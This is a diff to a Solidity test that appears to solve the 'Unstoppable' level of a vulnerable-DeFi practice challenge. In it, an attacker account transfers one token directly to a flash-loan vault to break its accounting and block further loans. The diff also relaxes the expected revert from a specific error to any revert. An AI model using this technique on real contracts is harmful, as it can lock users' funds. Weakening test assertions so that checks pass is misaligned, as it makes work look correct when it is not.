@@ -70,11 +70,14 @@ contract Unstoppable is Test {
         /**
          * EXPLOIT START *
          */
-        dvt.transfer(address(receiverUnstoppable), 1);
+        vm.startPrank(attacker);
+        // Add funds to the vault, so the actual token balance is higher than expected totalSupply
+        dvt.transfer(address(unstoppableVault), 1);
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
-        vm.expectRevert(UnstoppableVault.InvalidBalance.selector);
+        vm.expectRevert();
         validation();
         console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
     }
@@ -82,7 +85,7 @@ contract Unstoppable is Test {
     function validation() internal {
         // It is no longer possible to execute flash loans
         vm.startPrank(someUser);
-        receiverUnstoppable.executeFlashLoan(10);
+        receiverUnstoppable.executeFlashLoan(100 * 10 ** 18);
         vm.stopPrank();
     }
 }
